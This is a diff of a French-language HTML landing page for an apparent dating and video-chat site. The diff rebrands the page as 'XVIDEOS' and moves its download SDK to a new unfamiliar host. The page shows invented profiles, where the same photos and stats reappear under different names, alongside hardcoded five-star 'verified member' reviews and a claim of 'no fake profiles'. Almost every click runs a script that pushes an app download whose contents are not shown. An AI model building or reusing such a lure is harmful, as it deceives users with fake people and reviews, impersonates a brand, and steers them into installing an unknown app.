@@ -1,16 +1,15 @@
-
 <!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
 
-   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+   <script src="https://api.xcty68.vip/js/meetu-sdk.js"></script>
 
   <script>function k2(e) {
   MeetU.download(event);
   }</script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>VIRGIN - Trouvez votre partenaire ce soir</title>
+  <title>XVIDEOS - Trouvez votre match parfait ce soir</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
@@ -57,10 +56,13 @@
       border-bottom: 1px solid var(--line);
     }
     .logo {
-      height: 32px;
-      width: auto;
-      display: block;
-      object-fit: contain;
+      font-size: 1.25rem;
+      font-weight: 900;
+      letter-spacing: -0.02em;
+      background: linear-gradient(120deg, var(--rose), var(--rose-2));
+      -webkit-background-clip: text;
+      background-clip: text;
+      -webkit-text-fill-color: transparent;
     }
     .topbar-pill {
       display: inline-flex;
@@ -159,6 +161,63 @@
     }
     .stat-num { font-size: 1.15rem; font-weight: 900; color: var(--rose); }
     .stat-label { font-size: 0.62rem; color: var(--muted); }
+
+    /* ---- Photo wall (hero, full-width vertical marquee) ---- */
+    .photo-wall {
+      position: relative;
+      display: flex;
+      gap: 10px;
+      height: 340px;
+      margin: 0 0 1.1rem;
+      overflow: hidden;
+      border-radius: 20px;
+      -webkit-mask-image: linear-gradient(to bottom, transparent 0, #000 26px, #000 calc(100% - 26px), transparent 100%);
+      mask-image: linear-gradient(to bottom, transparent 0, #000 26px, #000 calc(100% - 26px), transparent 100%);
+    }
+    .pw-col { flex: 1; min-width: 0; overflow: hidden; }
+    .pw-track { display: flex; flex-direction: column; will-change: transform; }
+    .pw-set { display: flex; flex-direction: column; gap: 10px; padding-bottom: 10px; }
+    .pw-photo {
+      position: relative;
+      overflow: hidden;
+      border-radius: 14px;
+      box-shadow: 0 4px 14px rgba(225, 29, 72, 0.10);
+    }
+    .pw-photo img {
+      position: absolute; inset: 0;
+      width: 100%; height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+    .pw-shade {
+      position: absolute; inset: 0;
+      background: linear-gradient(180deg, rgba(0,0,0,0.16) 0%, rgba(0,0,0,0) 30%, rgba(0,0,0,0) 55%, rgba(0,0,0,0.72) 100%);
+      pointer-events: none;
+    }
+    .pw-badge {
+      position: absolute; top: 8px; left: 8px;
+      display: inline-flex; align-items: center; gap: 4px;
+      padding: 3px 8px; border-radius: 9px;
+      font-size: 0.5rem; font-weight: 800;
+      letter-spacing: 0.03em; text-transform: uppercase; color: #fff;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.18);
+    }
+    .pw-badge.online { background: linear-gradient(135deg, #10b981, #34d399); }
+    .pw-badge.hot { background: linear-gradient(135deg, #f97316, #fb923c); }
+    .pw-badge.new { background: linear-gradient(135deg, #8b5cf6, #a78bfa); }
+    .pw-live-dot { width: 5px; height: 5px; border-radius: 50%; background: #fff; animation: pwLive 1.6s infinite; }
+    @keyframes pwLive { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+    .pw-meta { position: absolute; left: 0; right: 0; bottom: 0; padding: 8px; }
+    .pw-name { color: #fff; font-size: 0.74rem; font-weight: 900; display: flex; align-items: center; gap: 4px; }
+    .pw-age { font-weight: 700; color: rgba(255, 255, 255, 0.85); font-size: 0.68rem; }
+    .pw-loc { font-size: 0.6rem; color: rgba(255, 255, 255, 0.8); margin-top: 1px; }
+    .pw-track.pw-up { animation: pwUp 24s linear infinite; }
+    .pw-track.pw-down { animation: pwDown 30s linear infinite; }
+    @keyframes pwUp { 0% { transform: translateY(0); } 100% { transform: translateY(-50%); } }
+    @keyframes pwDown { 0% { transform: translateY(-50%); } 100% { transform: translateY(0); } }
+    @media (prefers-reduced-motion: reduce) {
+      .pw-track.pw-up, .pw-track.pw-down { animation: none; }
+    }
 
     /* ---- Sections ---- */
     .sec { padding: 1.4rem 1.25rem; }
@@ -555,23 +614,21 @@
 
   <!-- Top bar -->
   <div class="topbar">
-    <img class="logo" src="images/s2.jpg?v=d" alt="logo">
+    <div class="logo">XVIDEOS</div>
     <div class="topbar-pill"><span class="dot"></span>En ligne</div>
   </div>
 
   <!-- Hero -->
   <section class="hero">
-    <div class="hero-badge"><span class="dot"></span>LIVE · Rencontres décontractées</div>
-    <h1>Trouvez votre<span class="gt"> Partenaire Idéal</span></h1>
-    <p class="hero-sub"> Vidéo en ligne en temps réel – De vraies personnes sont en ligne en ce moment, chat vidéo instantané.</p>
+    <div class="hero-badge"><span class="dot"></span>EN DIRECT · Rencontres décontractées</div>
+    <h1>Trouvez votre<span class="gt"> match parfait</span></h1>
+    <p class="hero-sub"> Vidéo en ligne en temps réel – De vraies personnes sont en ligne maintenant, discutez en vidéo instantanément.</p>
+
+    <!-- Photo wall -->
+    <div class="photo-wall" id="photoWall" aria-hidden="true"></div>
 
     <!-- Video player -->
-         <!-- Video player -->
-    <div class="video-player">
-      <video id="myVideo" controls autoplay muted playsinline webkit-playsinline style="width:100%; height:100%;">
-        <source src="video.webm" type="video/webm">
-      </video>
-    </div>
+     
 
     <div class="avatar-stack">
       <img src="images/10-1.jpg" alt="">
@@ -582,17 +639,17 @@
     </div>
     <div class="stats-row">
       <div><div class="stat-num">100%</div><div class="stat-label">Inscription gratuite</div></div>
-      <div><div class="stat-num">24h/7j</div><div class="stat-label">Vrais membres</div></div>
-      <div><div class="stat-num">Instantané</div><div class="stat-label">Match</div></div>
+      <div><div class="stat-num">24/7</div><div class="stat-label">Membres réels</div></div>
+      <div><div class="stat-num">Instantané</div><div class="stat-label">Correspondance</div></div>
     </div>
   </section>
 
   <!-- Hot picks -->
   <section class="sec" style="padding-top:0.6rem">
     <div class="sec-head">
-      <div class="sec-tag">🔥 Les plus vues en ce moment</div>
+      <div class="sec-tag">🔥 Les plus vus en ce moment</div>
       <h2 class="sec-title">Qui est disponible ce soir</h2>
-      <p class="sec-sub"><span style="color:var(--emerald);font-weight:700">Personnes</span> connectées maintenant</p>
+      <p class="sec-sub"><span style="color:var(--emerald);font-weight:700">Personnes</span> en ligne maintenant</p>
     </div>
     <div class="hot-scroll" id="hotScroll"></div>
     <div class="hot-dots" id="hotDots"></div>
@@ -609,7 +666,7 @@
 
   <!-- Safety -->
   <section class="sec" style="background:rgba(255,255,255,0.5)">
-    <h2 class="sec-title" style="text-align:center;margin-bottom:0.9rem">Sûr et privé</h2>
+    <h2 class="sec-title" style="text-align:center;margin-bottom:0.9rem">Sûr &amp; privé</h2>
     <div class="safety-grid">
       <div class="safety-item">
         <div class="ic" style="background:rgba(16,185,129,0.12)">
@@ -638,15 +695,15 @@
   <!-- Reviews -->
   <section class="sec">
     <div class="sec-head">
-      <h2 class="sec-title">Ce qu'ils disent</h2>
-      <p class="sec-sub">De vraies histoires de personnes qui ont trouvé leur partenaire</p>
+      <h2 class="sec-title">Ce qu'ils en disent</h2>
+      <p class="sec-sub">Des histoires vraies de personnes qui ont trouvé leur partenaire</p>
     </div>
     <div class="review-scroll" id="reviewScroll">
-      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« J'ai rencontré une fille incroyable ici vendredi dernier. Nous avons discuté, puis pris un verre le soir même et l'alchimie a été immédiate. Le meilleur rendez-vous depuis des années ! »</p><div class="review-author"><img src="images/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Membre vérifié</div></div></div></div>
-      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« Tout le monde ici est réel et authentique. Pas de faux profils, pas de jeux. J'ai rencontré 3 femmes formidables en 2 semaines. Chaque rendez-vous était meilleur que le précédent ! »</p><div class="review-author"><img src="images/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Membre vérifié</div></div></div></div>
-      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« J'étais sceptique, mais j'ai rencontré Blessing et le courant est passé instantanément. Nous avons partagé un dîner incroyable. Je la reverrai ce week-end ! »</p><div class="review-author"><img src="images/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Membre vérifié</div></div></div></div>
-      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« C'est tellement facile de trouver quelqu'un avec qui on se connecte vraiment. Vous voyez exactement à qui vous parlez. Pas de temps perdu, juste de vrais rendez-vous avec de vraies personnes. »</p><div class="review-author"><img src="images/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Membre vérifié</div></div></div></div>
-      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">« Je me suis inscrit jeudi et j'ai eu un rendez-vous vendredi soir. Nous sommes allés prendre un café et avons parlé pendant des heures. De loin la connexion la plus naturelle que j'aie jamais eue. »</p><div class="review-author"><img src="images/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"J'ai rencontré une fille incroyable ici vendredi dernier. Nous avons discuté, puis nous nous sommes retrouvés pour boire un verre le soir même et l'alchimie a été immédiate. Le meilleur rendez-vous depuis des années !"</p><div class="review-author"><img src="images/c1.jpg" alt=""><div><div class="review-author-name">Emeka</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Tout le monde ici est réel et authentique. Pas de faux profils, pas de jeux. J'ai rencontré 3 femmes merveilleuses en 2 semaines. Chaque rendez-vous était meilleur que le précédent !"</p><div class="review-author"><img src="images/c2.jpg" alt=""><div><div class="review-author-name">Tunde</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"J'étais sceptique, mais j'ai rencontré Blessing et le courant est passé tout de suite. Nous avons passé un dîner formidable. Je la reverrai ce week-end !"</p><div class="review-author"><img src="images/c3.jpg" alt=""><div><div class="review-author-name">David</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"C'est si facile de trouver quelqu'un avec qui on se connecte vraiment. Vous voyez exactement à qui vous parlez. Pas de temps perdu, juste de vrais rendez-vous avec de vraies personnes."</p><div class="review-author"><img src="images/c4.jpg" alt=""><div><div class="review-author-name">Chuka</div><div class="review-author-role">Membre vérifié</div></div></div></div>
+      <div class="review-card"><div class="review-stars">★★★★★</div><p class="review-text">"Je me suis inscrit jeudi et j'ai eu un rendez-vous vendredi soir. Nous sommes allés boire un café et avons parlé pendant des heures. La connexion la plus naturelle que j'aie jamais eue."</p><div class="review-author"><img src="images/c5.jpg" alt=""><div><div class="review-author-name">Femi</div><div class="review-author-role">Membre vérifié</div></div></div></div>
     </div>
   </section>
 
@@ -659,66 +716,66 @@
 
   <!-- Floating CTA -->
   <div class="float-cta">
-    <a href="javascript:void(0)" class="float-cta-btn" onclick="k2(event)">💘 Téléchargez l'app maintenant. <span class="cta-free">Gratuit</span></a>
+    <a href="javascript:void(0)" class="float-cta-btn" onclick="k2(event)">💘 Télécharger maintenant <span class="cta-free">Gratuit</span></a>
   </div>
 
-  <div class="ft">XVIDEOS · Connectez-vous avec des célibataires près de chez vous</div>
+  <div class="ft">XVIDEOS · Rencontrez des célibataires près de chez vous</div>
 
   <!-- Download popup -->
   <div class="dl-overlay" id="dlOverlay" onclick="k2(event)">
     <div class="dl-card">
       <button class="dl-close" onclick="event.stopPropagation(); closeDownload()" aria-label="Fermer">×</button>
-
+      
       <h3>Débloquez l'accès complet</h3>
-      <p class="dl-sub">Téléchargez l'app pour tout regarder gratuitement — chaque profil, photo et discussion.</p>
+      <p class="dl-sub">Téléchargez l'application pour tout regarder gratuitement — chaque profil, photo et discussion.</p>
       <div class="dl-list">
         <div class="dl-item"><span class="dl-chk">✓</span>Inscription 100% gratuite</div>
-        <div class="dl-item"><span class="dl-chk">✓</span>Voir chaque profil et photo</div>
-        <div class="dl-item"><span class="dl-chk">✓</span>Discutez avec de vrais célibataires près de chez vous</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>Voir tous les profils &amp; photos</div>
+        <div class="dl-item"><span class="dl-chk">✓</span>Discutez avec de vrais célibataires locaux</div>
       </div>
-      <span class="dl-btn">Obtenez l'app gratuitement · Commencez maintenant</span>
-      <div class="dl-note">🔒 Sécurisé et privé — aucune carte bancaire requise</div>
+      <span class="dl-btn">Téléchargez l'app gratuite · Commencez maintenant</span>
+      <div class="dl-note">🔒 Sécurisé &amp; privé — aucune carte bancaire requise</div>
     </div>
   </div>
 
   <script>
     var USERS = [
-      {n:1,  name:'Ada',       age:20, job:'Maquilleuse',   h:'173cm', w:'116lbs', badge:'En ligne',  bt:'online'},
-      {n:2,  name:'Darlene',   age:22, job:'Étudiante',     h:'176cm', w:'109lbs', badge:'Populaire', bt:'hot'},
-      {n:3,  name:'Alma',      age:25, job:'Étudiante',     h:'165cm', w:'112lbs', badge:'Nouvelle',  bt:'new'},
-      {n:4,  name:'Bonnie',    age:26, job:'Coach fitness', h:'168cm', w:'116lbs', badge:'En ligne',  bt:'online'},
-      {n:5,  name:'Dora',      age:24, job:'Médecin',       h:'165cm', w:'104lbs', badge:'Populaire', bt:'hot'},
-      {n:6,  name:'Camille',   age:24, job:'Médecin',       h:'165cm', w:'104lbs', badge:'En ligne',  bt:'online'},
-      {n:7,  name:'Cara',      age:26, job:'Photographe',   h:'168cm', w:'113lbs', badge:'Nouvelle',  bt:'new'},
-      {n:8,  name:'Debby',     age:21, job:'Étudiante',     h:'168cm', w:'108lbs', badge:'En ligne',  bt:'online'},
-      {n:9,  name:'Fanny',     age:23, job:'Étudiante',     h:'167cm', w:'115lbs', badge:'Populaire', bt:'hot'},
-      {n:10, name:'Elaine',    age:25, job:'Étudiante',     h:'170cm', w:'122lbs', badge:'En ligne',  bt:'online'},
-      {n:11, name:'Gemma',     age:28, job:'Photographe',   h:'172cm', w:'125lbs', badge:'Nouvelle',  bt:'new'},
-      {n:12, name:'Hedy',      age:22, job:'Maquilleuse',   h:'166cm', w:'108lbs', badge:'En ligne',  bt:'online'},
-      {n:1,  name:'Hulda',     age:27, job:'Comptable',     h:'169cm', w:'120lbs', badge:'Populaire', bt:'hot'},
-      {n:2,  name:'Jade',      age:24, job:'Étudiante',     h:'164cm', w:'110lbs', badge:'En ligne',  bt:'online'},
-      {n:3,  name:'Joyce',     age:26, job:'Médecin',       h:'171cm', w:'118lbs', badge:'Nouvelle',  bt:'new'},
-      {n:4,  name:'Kama',      age:25, job:'Pharmacienne',  h:'168cm', w:'113lbs', badge:'En ligne',  bt:'online'},
-      {n:5,  name:'Laura',     age:28, job:'Coach fitness', h:'174cm', w:'126lbs', badge:'Populaire', bt:'hot'},
-      {n:6,  name:'Elsie',     age:27, job:'Étudiante',     h:'167cm', w:'115lbs', badge:'En ligne',  bt:'online'},
-      {n:1,  name:'Emma',      age:20, job:'Maquilleuse',   h:'173cm', w:'116lbs', badge:'En ligne',  bt:'online'},
-      {n:2,  name:'Olivia',    age:22, job:'Étudiante',     h:'176cm', w:'109lbs', badge:'Populaire', bt:'hot'},
-      {n:3,  name:'Ava',       age:25, job:'Étudiante',     h:'165cm', w:'112lbs', badge:'Nouvelle',  bt:'new'},
-      {n:4,  name:'Sophia',    age:26, job:'Coach fitness', h:'168cm', w:'116lbs', badge:'En ligne',  bt:'online'},
-      {n:5,  name:'Isabella',  age:24, job:'Étudiante',     h:'165cm', w:'104lbs', badge:'Populaire', bt:'hot'},
-      {n:6,  name:'Mia',       age:24, job:'Médecin',       h:'165cm', w:'104lbs', badge:'En ligne',  bt:'online'},
-      {n:7,  name:'Charlotte', age:26, job:'Photographe',   h:'168cm', w:'113lbs', badge:'Nouvelle',  bt:'new'},
-      {n:8,  name:'Amelia',    age:21, job:'Étudiante',     h:'168cm', w:'108lbs', badge:'En ligne',  bt:'online'},
-      {n:9,  name:'Harper',    age:23, job:'Étudiante',     h:'167cm', w:'115lbs', badge:'Populaire', bt:'hot'},
-      {n:10, name:'Evelyn',    age:25, job:'Étudiante',     h:'170cm', w:'122lbs', badge:'En ligne',  bt:'online'},
-      {n:11, name:'Abigail',   age:28, job:'Photographe',   h:'172cm', w:'125lbs', badge:'Nouvelle',  bt:'new'},
-      {n:12, name:'Lily',      age:22, job:'Maquilleuse',   h:'166cm', w:'108lbs', badge:'En ligne',  bt:'online'}
+      {n:1, name:'Ada',      age:20, job:'Maquilleuse',      h:'173cm', w:'116lbs', loc:'Lagos',          badge:'En ligne', bt:'online'},
+      {n:2, name:'Darlene',  age:22, job:'Étudiante',        h:'176cm', w:'109lbs', loc:'Abuja',          badge:'Populaire',  bt:'hot'},
+      {n:3, name:'Alma',     age:25, job:'Étudiante',        h:'165cm', w:'112lbs', loc:'Port Harcourt',  badge:'Nouvelle',    bt:'new'},
+      {n:4, name:'Bonnie',   age:26, job:'Coach de fitness',h:'168cm', w:'116lbs', loc:'Kano',           badge:'En ligne', bt:'online'},
+      {n:5, name:'Dora',     age:24, job:'Médecin',           h:'165cm', w:'104lbs', loc:'Ibadan',         badge:'Populaire',  bt:'hot'},
+      {n:6, name:'Camille',  age:24, job:'Médecin',           h:'165cm', w:'104lbs', loc:'Enugu',          badge:'En ligne', bt:'online'},
+      {n:7, name:'Cara',     age:26, job:'Photographe',         h:'168cm', w:'113lbs', loc:'Benin City',     badge:'Nouvelle',    bt:'new'},
+      {n:8, name:'Debby',    age:21, job:'Étudiante',        h:'168cm', w:'108lbs', loc:'Owerri',         badge:'En ligne', bt:'online'},
+      {n:9, name:'Fanny',    age:23, job:'Étudiante',        h:'167cm', w:'115lbs', loc:'Kaduna',         badge:'Populaire',  bt:'hot'},
+      {n:10,name:'Elaine',   age:25, job:'Étudiante',        h:'170cm', w:'122lbs', loc:'Abeokuta',       badge:'En ligne', bt:'online'},
+      {n:11,name:'Gemma',    age:28, job:'Photographe',         h:'172cm', w:'125lbs', loc:'Onitsha',        badge:'Nouvelle',    bt:'new'},
+      {n:12,name:'Hedy',     age:22, job:'Maquilleuse',      h:'166cm', w:'108lbs', loc:'Warri',          badge:'En ligne', bt:'online'},
+      {n:1, name:'Hulda',    age:27, job:'Comptable',         h:'169cm', w:'120lbs', loc:'Calabar',        badge:'Populaire',  bt:'hot'},
+      {n:2, name:'Jade',     age:24, job:'Étudiante',        h:'164cm', w:'110lbs', loc:'Uyo',            badge:'En ligne', bt:'online'},
+      {n:3, name:'Joyce',    age:26, job:'Médecin',           h:'171cm', w:'118lbs', loc:'Jos',            badge:'Nouvelle',    bt:'new'},
+      {n:4, name:'Kama',     age:25, job:'Pharmacienne',      h:'168cm', w:'113lbs', loc:'Maiduguri',      badge:'En ligne', bt:'online'},
+      {n:5, name:'Laura',    age:28, job:'Coach de fitness',h:'174cm', w:'126lbs', loc:'Sokoto',         badge:'Populaire',  bt:'hot'},
+      {n:6, name:'Elsie',    age:27, job:'Étudiante',        h:'167cm', w:'115lbs', loc:'Ilorin',         badge:'En ligne', bt:'online'},
+      {n:1, name:'Emma',     age:20, job:'Maquilleuse',      h:'173cm', w:'116lbs', loc:'Lagos',          badge:'En ligne', bt:'online'},
+      {n:2, name:'Olivia',   age:22, job:'Étudiante',        h:'176cm', w:'109lbs', loc:'Abuja',          badge:'Populaire',  bt:'hot'},
+      {n:3, name:'Ava',      age:25, job:'Étudiante',        h:'165cm', w:'112lbs', loc:'Port Harcourt',  badge:'Nouvelle',    bt:'new'},
+      {n:4, name:'Sophia',   age:26, job:'Coach de fitness',h:'168cm', w:'116lbs', loc:'Kano',           badge:'En ligne', bt:'online'},
+      {n:5, name:'Isabella', age:24, job:'Étudiante',        h:'165cm', w:'104lbs', loc:'Ibadan',         badge:'Populaire',  bt:'hot'},
+      {n:6, name:'Mia',      age:24, job:'Médecin',           h:'165cm', w:'104lbs', loc:'Enugu',          badge:'En ligne', bt:'online'},
+      {n:7, name:'Charlotte',age:26, job:'Photographe',         h:'168cm', w:'113lbs', loc:'Benin City',     badge:'Nouvelle',    bt:'new'},
+      {n:8, name:'Amelia',   age:21, job:'Étudiante',        h:'168cm', w:'108lbs', loc:'Owerri',         badge:'En ligne', bt:'online'},
+      {n:9, name:'Harper',   age:23, job:'Étudiante',        h:'167cm', w:'115lbs', loc:'Kaduna',         badge:'Populaire',  bt:'hot'},
+      {n:10,name:'Evelyn',   age:25, job:'Étudiante',        h:'170cm', w:'122lbs', loc:'Abeokuta',       badge:'En ligne', bt:'online'},
+      {n:11,name:'Abigail',  age:28, job:'Photographe',         h:'172cm', w:'125lbs', loc:'Onitsha',        badge:'Nouvelle',    bt:'new'},
+      {n:12,name:'Lily',     age:22, job:'Maquilleuse',      h:'166cm', w:'108lbs', loc:'Warri',          badge:'En ligne', bt:'online'}
     ];
 
     var HOT = [
       {n:1, name:'Ada',     age:20, badge:'Populaire',       bt:'popular',  views:'12.4K'},
       {n:2, name:'Darlene', age:22, badge:'Nouvelle',bt:'new',      views:'8.2K'},
-      {n:3, name:'Alma',    age:25, badge:'Vérifiée',    bt:'verified', views:'15.7K'},
+      {n:3, name:'Alma',    age:25, badge:'Vérifié',    bt:'verified', views:'15.7K'},
       {n:4, name:'Bonnie',  age:26, badge:'Populaire',       bt:'popular',  views:'20.1K'},
       {n:5, name:'Dora',    age:24, badge:'Nouvelle',bt:'new',      views:'9.8K'},
       {n:6, name:'Camille', age:24, badge:'VIP',           bt:'vip',      views:'18.3K'}
@@ -741,20 +798,55 @@
     var ratios = ['3/4', '4/5', '1/1', '3/4', '4/5', '3/4'];
     var colL = '', colR = '';
     USERS.slice(0, 15).forEach(function(u, i) {
-      var card = '<div class="p-card" style="aspect-ratio:' + ratios[i % ratios.length] + ';" onclick="openViewer(\'' + u.name + '\',\'' + u.age + '\',\'' + u.job + '\',\'' + u.h + '\',\'' + u.w + '\',\'\',\'images/' + u.n + '-1.jpg\')">'
+      var card = '<div class="p-card" style="aspect-ratio:' + ratios[i % ratios.length] + ';" onclick="openViewer(\'' + u.name + '\',\'' + u.age + '\',\'' + u.job + '\',\'' + u.h + '\',\'' + u.w + '\',\'' + u.loc + '\',\'images/' + u.n + '-1.jpg\')">'
         + '<img src="images/' + u.n + '-1.jpg" alt="">'
         + '<div class="p-shade"></div>'
         + '<span class="p-badge ' + u.bt + '">' + u.badge + '</span>'
-        + '<button class="p-play" onclick="event.stopPropagation();k2(event)" aria-label="Lire la vidéo">'
+        + '<button class="p-play" onclick="event.stopPropagation();k2(event)" aria-label="Play video">'
         + '<svg width="16" height="16" viewBox="0 0 24 24" fill="#fff"><path d="M8 5v14l11-7z"></path></svg>'
         + '</button>'
         + '<div class="p-info">'
         + '<div class="p-name">' + u.name + ' <span class="v">✓</span> <span class="p-age">' + u.age + '</span></div>'
-        + '<div class="p-job">' + u.job + '</div>'
+        + '<div class="p-job">' + u.job + '</div>' 
         + '</div></div>';
       if (i % 2 === 0) { colL += card; } else { colR += card; }
     });
     document.getElementById('userList').innerHTML = '<div class="p-col">' + colL + '</div><div class="p-col">' + colR + '</div>';
+
+    // Photo wall (hero): two columns, opposite-direction vertical marquee
+    (function() {
+      var wall = document.getElementById('photoWall');
+      if (!wall) return;
+      var ratios = ['3/4', '4/5', '1/1', '3/4', '4/5', '3/4'];
+      var byN = {};
+      USERS.forEach(function(u) { if (!(u.n in byN)) byN[u.n] = u; });
+      function photo(n, offset) {
+        var u = byN[n] || {};
+        var dot = u.bt === 'online' ? '<span class="pw-live-dot"></span>' : '';
+        var badge = u.badge ? '<span class="pw-badge ' + (u.bt || 'online') + '">' + dot + u.badge + '</span>' : '';
+        var meta = '<div class="pw-meta">'
+          + '<div class="pw-name">' + (u.name || '') + (u.age ? ' <span class="pw-age">' + u.age + '</span>' : '') + '</div>'
+          + (u.loc ? '<div class="pw-loc">📍 ' + u.loc + '</div>' : '')
+          + '</div>';
+        return '<div class="pw-photo" style="aspect-ratio:' + ratios[offset % ratios.length] + '">'
+          + '<img src="images/' + n + '-1.jpg" alt="">'
+          + '<div class="pw-shade"></div>'
+          + badge + meta
+          + '</div>';
+      }
+      function buildSet(nums, startOffset) {
+        var html = '';
+        nums.forEach(function(n, i) { html += photo(n, startOffset + i); });
+        return '<div class="pw-set">' + html + '</div>';
+      }
+      function buildCol(nums, cls, startOffset) {
+        return '<div class="pw-col"><div class="pw-track ' + cls + '">'
+          + buildSet(nums, startOffset) + buildSet(nums, startOffset)
+          + '</div></div>';
+      }
+      wall.innerHTML = buildCol([1, 2, 3, 4, 5, 6], 'pw-up', 0)
+        + buildCol([7, 8, 9, 10, 11, 12], 'pw-down', 2);
+    })();
 
     // Viewer
     function openViewer(name, age, job, h, w, loc, src) {
@@ -762,6 +854,7 @@
       var info = '<div class="v-name">' + name + ', ' + age + '</div>';
       if (job) info += '<div class="v-job">' + job + '</div>';
       if (h && w) info += '<div class="v-stats">' + h + ' · ' + w + '</div>';
+      if (loc) info += '<div class="v-loc">' + loc + '</div>';
       document.getElementById('vInfo').innerHTML = info;
       document.getElementById('viewer').classList.add('on');
       document.body.style.overflow = 'hidden';
